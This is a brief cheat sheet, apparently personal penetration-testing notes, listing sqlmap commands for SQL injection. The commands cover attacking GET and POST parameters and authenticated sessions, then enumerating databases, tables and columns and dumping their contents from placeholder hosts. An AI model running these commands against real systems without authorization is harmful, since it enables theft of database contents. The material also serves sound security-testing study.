SQLMap

# attacking parameters in GET request
sqlmap -u "http://vuln.com/id=1&str=a"

# attacking parameters in POST request
sqlmap -u "http://vulnpost.com/" --data="user_name=user&password=password&Submit_button=Submit"

# attacking against a specific parame
sqlmap -u "http://vulnpost.com/" --data="user_name=user&password=password&Submit_button=Submit" -p "id"

# attacking with default options
sqlmap -u "http://vuln.com/id=1&str=a" --batch

# attacking on a session; after loggin in
sqlmap -u "http://vuln.com/id=1&str=a" --cookie="cookie1=val;cookie2=val"

# sql pwn flow
# database -> tables -> columns = Inforamtion

# attack and enumerate the databases
sqlmap -u "http://vuln.com/id=1&str=a" --dbs

# attack on a specific database and enumerate tables
sqlmap -u "http://vuln.com/id=1&str=a" -D <database_name> --tables

# attack and dump the contents of the specified table in the database
sqlmap -u "http://vuln.com/id=1&str=a" -D <database_name> -T <table_name> --dump

# enumerate all the columns in the table in the database
sqlmap -u "http://vuln.com/id=1&str=a" -D <database_name> -T <table_name> --columns

# dump values from specific columns in the table from a specified database
sqlmap -u "http://vuln.com/id=1&str=a" -D <database_name> -T <table_name> -C <column_1, column_2> --dump 

# dumped files output will be sotred in 
cat /home/$USER/.sqlmap/output/vuln.com/dump/<file>
